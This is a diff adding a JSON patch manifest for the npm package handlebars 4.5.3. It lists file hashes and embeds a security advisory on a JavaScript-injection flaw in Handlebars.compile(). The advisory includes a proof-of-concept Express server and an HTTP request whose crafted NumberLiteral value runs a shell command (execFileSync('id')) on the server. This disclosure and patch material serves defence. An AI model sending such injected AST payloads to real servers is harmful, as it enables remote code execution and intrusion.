@@ -1,0 +1,55 @@
+{
+  "patches": {
+    "pkg:npm/handlebars@4.5.3": {
+      "uuid": "47548738-ef80-4331-9cb2-1fdcc3118203",
+      "exportedAt": "Mon, 22 Jun 2026 23:36:11 GMT",
+      "files": {
+        "package/dist/amd/handlebars/compiler/base.js": {
+          "beforeHash": "83f263a9398662553bbbd6df594cba870413e07e5cc91d841aaddcc2f9cf2c8f",
+          "afterHash": "748bb34498f53b559257f872ef9359063e6ce64caca735023740e1a14425453c"
+        },
+        "package/dist/amd/handlebars/compiler/compiler.js": {
+          "beforeHash": "bae47aaad1c40de32e6ee9b38976d15cf1e0dcc02c9e7a3903625703f75b18e2",
+          "afterHash": "e5505b0fd0177d8712b6af486d17094905dc6316526e84e99078f51a47588319"
+        },
+        "package/dist/cjs/handlebars/compiler/base.js": {
+          "beforeHash": "2eef20d76eaea527c0757f897d785cf2c46bd7d920da6a4a055c4a18e4a09114",
+          "afterHash": "46a3f29c3141686a4bf771a5b968e11164e474cf2a5bb81d38868a1d0f6c1426"
+        },
+        "package/dist/cjs/handlebars/compiler/compiler.js": {
+          "beforeHash": "9b0a5ea03a10111f2afb516a4533699112c54848f34dadd402253dbb8baa7355",
+          "afterHash": "3f8c69d1bd9ed78009d6db7bc1a77e39068187eff14680f79baccc141c4303f5"
+        },
+        "package/dist/handlebars.amd.js": {
+          "beforeHash": "6b9dbfdb79c463d1741226f7cc7b90b2e2d56f598852844d6bc0027eef2833c6",
+          "afterHash": "f95cd908568ebb95c1cd1aa90e17e61054195b4cf7c7a5009d477ec92d3ed082"
+        },
+        "package/dist/handlebars.js": {
+          "beforeHash": "5d06f7282f60013738b5f64c13bcf88bfd060affc410c4215e9765dec9d55a67",
+          "afterHash": "1c097ddd9798fe1ce7c1a7d1dd23e0d701aa361b923d0cb220f15e82fb5e6ea0"
+        },
+        "package/lib/handlebars/compiler/base.js": {
+          "beforeHash": "578e6e75301db5853b3fb84d1bf46d63d85100df32ea6119415a44232a8f2363",
+          "afterHash": "398314acd0bbc1906e6241c4882b8f15632892cee34e35730e031047fe8f4e73"
+        },
+        "package/lib/handlebars/compiler/compiler.js": {
+          "beforeHash": "e60f15822ba585fa9fd71798de0aef3590df1c2afe4b297537fca3b1494c49a0",
+          "afterHash": "403e3ce52bf0accee596612030d345f14831feb7f45f1a944b268fa43d257df0"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-2w6w-674q-4c4q": {
+          "cves": [
+            "CVE-2026-33937"
+          ],
+          "summary": "Handlebars.js has JavaScript Injection via AST Type Confusion",
+          "severity": "CRITICAL",
+          "description": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib/handlebars/compiler/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n// Simplified representation of the vulnerable code path:\n// NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and passes the result directly to `Handlebars.compile()` is exploitable.\n\n## Proof of Concept\n\nServer-side Express application that passes `req.body.text` to `Handlebars.compile()`:\n\n\n```Javascript\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  let text = req.body.text;\n  let template = Handlebars.compile(text);\n  let result = template();\n  res.send(result);\n});\n\napp.listen(2123);\n```\n\n```\nPOST /api/render HTTP/1.1\nContent-Type: application/json\nHost: 127.0.0.1:2123\n\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"body\": [\n      {\n        \"type\": \"MustacheStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\",\n          \"data\": false,\n          \"depth\": 0,\n          \"parts\": [\"lookup\"],\n          \"original\": \"lookup\",\n          \"loc\": null\n        },\n        \"params\": [\n          {\n            \"type\": \"PathExpression\",\n            \"data\": false,\n            \"depth\": 0,\n            \"parts\": [],\n            \"original\": \"this\",\n            \"loc\": null\n          },\n          {\n            \"type\": \"NumberLiteral\",\n            \"value\": \"{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //\",\n            \"original\": 1,\n            \"loc\": null\n          }\n        ],\n        \"escaped\": true,\n        \"strip\": { \"open\": false, \"close\": false },\n        \"loc\": null\n      }\n    ]\n  }\n}\n```\n\nThe response body will contain the output of the `id` command executed on the server.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    }
+  }
+}
